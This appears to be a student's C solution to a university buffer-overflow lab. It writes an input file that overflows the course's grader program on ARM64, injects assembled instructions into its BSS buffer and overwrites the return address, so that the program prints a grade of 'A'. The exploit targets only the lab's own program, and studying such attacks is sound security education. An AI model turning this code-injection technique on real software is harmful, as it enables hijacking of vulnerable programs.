/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Jiatong Yu, Jacqueline He                                  */
/*--------------------------------------------------------------------*/
#include <stdio.h>
#include "miniassembler.h"

/* main function writes to dataA, which overwrites the grader
program to give A */
int main(void) {
    unsigned int mlRes;
    int i;
    FILE* psFile;
    psFile = fopen("dataA", "w");

    /* put name into BSS section (buf[0] to buf[6]) */
    fprintf(psFile, "Yu & He");

    /* null terminating (buf[7]) */
    putc('\0',psFile);


    /* mov w0, 'A'      buf[8] to buf[11] */
    mlRes = MiniAssembler_mov(0,'A');
    fwrite(&mlRes, sizeof(unsigned int), 1, psFile);

    /* adr x1, grade (addr ) 0x420044  buf[12] (420064) to buf[15]  */
    mlRes = MiniAssembler_adr(1, 0x420044, 0x420064);
    fwrite(&mlRes, sizeof(unsigned int), 1, psFile);

    /* strb w0, [x1]  buf[16] to buf[19] */
    mlRes = MiniAssembler_strb(0, 1);
    fwrite(&mlRes, sizeof(unsigned int), 1, psFile);

    /* branch to printf function, ulAddrOfThisInstr is buf[0] + 20 */
    /* magic number: ulAddrOfThisInstr is 0x42006C, 
        printf addr is 0x400864 */
    /* buf[20] to buf[23] */    
    mlRes = MiniAssembler_b(0x400864, 0x42006C);
    fwrite(&mlRes, sizeof(unsigned int), 1, psFile);

    /* remaining fillers (24 bytes) */
    for(i = 0; i < 24; i++) {
        putc('\0', psFile);
    }

    /* change x30 into bss section buf[8] which is 0x420060 */
    mlRes = 0x420060;
    fwrite(&mlRes, sizeof(unsigned int), 1, psFile);

    fclose(psFile);
    return 1;
    
}